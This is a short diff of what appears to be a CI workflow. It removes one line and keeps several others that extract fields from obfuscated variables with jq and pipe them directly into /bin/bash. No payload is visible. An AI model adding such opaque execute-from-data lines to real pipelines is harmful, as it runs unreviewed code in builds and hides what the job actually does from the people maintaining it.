@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$v1410" | jq -r .gdlou540 | /bin/bash
           echo $fdfpk5 | jq -r .cz2448 | /bin/bash
           echo $x0 | jq -r .nhstx81 | /bin/bash
-          printf '%s' "$ppi6133" | jq -r .pmwe730 | /bin/bash
           echo $ip2 | jq -r .eh8646 | /bin/bash
 
       - name: Upload results
